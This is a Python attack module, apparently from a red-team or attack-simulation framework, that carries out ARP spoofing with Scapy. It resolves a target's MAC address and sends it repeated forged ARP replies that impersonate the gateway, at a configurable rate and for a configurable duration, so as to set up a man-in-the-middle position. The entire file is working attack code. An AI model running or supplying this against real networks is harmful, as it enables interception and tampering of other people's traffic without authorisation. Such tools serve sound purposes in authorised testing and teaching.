"""ARP Spoofing — MITM via ARP cache poisoning using Scapy."""
from modules.attacks.base import BaseAttack, AttackResult, logger
import time


class ArpSpoofAttack(BaseAttack):
    name = "arp_spoo"
    description = "ARP spoofing — man-in-the-middle via cache poisoning"
    mitre_ref = "T1557.002"

    def run(self, target_ip: str, duration_s: int = 60, intensity: str = "medium",
            gateway_ip: str = "", **kwargs) -> AttackResult:
        if not self.validate(target_ip):
            return AttackResult(success=False, error=f"Invalid IP: {target_ip}")
        if not gateway_ip:
            return AttackResult(success=False, error="gateway_ip required")
        interval = {"low": 2.0, "medium": 0.5, "high": 0.1}.get(intensity, 0.5)
        try:
            from scapy.all import ARP, Ether, sendp, getmacbyip
            target_mac = getmacbyip(target_ip)
            if not target_mac:
                return AttackResult(success=False, error=f"Cannot resolve MAC for {target_ip}")
            pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip)
            start = time.time()
            count = 0
            while time.time() - start < duration_s:
                sendp(pkt, verbose=False)
                count += 1
                time.sleep(interval)
            elapsed = time.time() - start
            logger.info("ARP spoof: %d packets in %.1fs → %s (gw=%s)", count, elapsed, target_ip, gateway_ip)
            return AttackResult(success=True, packets=count, duration=elapsed)
        except ImportError:
            return AttackResult(success=False, error="scapy required")
        except Exception as e:
            return AttackResult(success=False, error=str(e))
